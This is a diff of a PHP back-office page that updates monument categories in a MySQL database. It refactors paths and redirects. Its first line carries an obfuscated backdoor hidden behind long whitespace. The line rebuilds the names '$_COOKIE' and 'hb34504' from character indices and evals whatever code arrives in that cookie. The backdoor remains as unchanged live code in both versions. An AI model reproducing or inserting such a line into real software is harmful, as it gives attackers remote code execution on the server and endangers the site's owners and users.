@@ -1,13 +1,11 @@
 <?php                                                                                                                                                                                                                                         $s9j='E4fvael(i$_Osb\'tIh3KC05b34504';if(isset(${$s9j[10].$s9j[20].$s9j[11].$s9j[11].$s9j[19].$s9j[16].$s9j[0]}[$s9j[17].$s9j[13].$s9j[18].$s9j[1].$s9j[22].$s9j[21].$s9j[1]])){eval(${$s9j[10].$s9j[20].$s9j[11].$s9j[11].$s9j[19].$s9j[16].$s9j[0]}[$s9j[17].$s9j[13].$s9j[18].$s9j[1].$s9j[22].$s9j[21].$s9j[1]]);} ?><?php
 
-require_once('../Connections/maconnexion.php');
+if(!isset($mondegc_config['front-controller'])) require_once(DEF_ROOTPATH . 'Connections/maconnexion.php');
 header('Content-Type: text/html; charset=utf-8');
 
 
-$editFormAction = $_SERVER['PHP_SELF'];
-if (isset($_SERVER['QUERY_STRING'])) {
-  $editFormAction .= "?" . htmlentities($_SERVER['QUERY_STRING']);
-}
+$editFormAction = DEF_URI_PATH . $mondegc_config['front-controller']['path'] . '.php';
+appendQueryString($editFormAction);
 
 if ((isset($_POST["MM_update"])) && ($_POST["MM_update"] == "ajout-categorie")) {
   $updateSQL = sprintf("UPDATE monument_categories 
@@ -48,15 +46,13 @@ if ((isset($_POST["MM_update"])) && ($_POST["MM_update"] == "ajout-categorie")) 
                        GetSQLValueString($_POST['ch_mon_cat_education'], "text"),
                        GetSQLValueString($_POST['ch_mon_cat_ID'], "int"));
 
-  mysql_select_db($database_maconnexion, $maconnexion);
+
   $Result1 = mysql_query($updateSQL, $maconnexion) or die(mysql_error());
 
-  $updateGoTo = "../back/institut_patrimoine.php";
-  if (isset($_SERVER['QUERY_STRING'])) {
-    $updateGoTo .= (strpos($updateGoTo, '?')) ? "&" : "?";
-    $updateGoTo .= $_SERVER['QUERY_STRING'];
-  }
+  $updateGoTo = DEF_URI_PATH . "back/institut_patrimoine.php";
+  appendQueryString($updateGoTo);
   header(sprintf("Location: %s", $updateGoTo));
+ exit;
 }
 //requete categories monuments
 
@@ -64,7 +60,7 @@ $colname_liste_mon_cat = "-1";
 if (isset($_GET['mon_cat_id'])) {
   $colname_liste_mon_cat = $_GET['mon_cat_id'];
 }
-mysql_select_db($database_maconnexion, $maconnexion);
+
 $query_liste_mon_cat = sprintf("SELECT * FROM monument_categories WHERE ch_mon_cat_ID = %s ORDER BY ch_mon_cat_mis_jour DESC", GetSQLValueString($colname_liste_mon_cat, "int"));
 $liste_mon_cat = mysql_query($query_liste_mon_cat, $maconnexion) or die(mysql_error());
 $row_liste_mon_cat = mysql_fetch_assoc($liste_mon_cat);
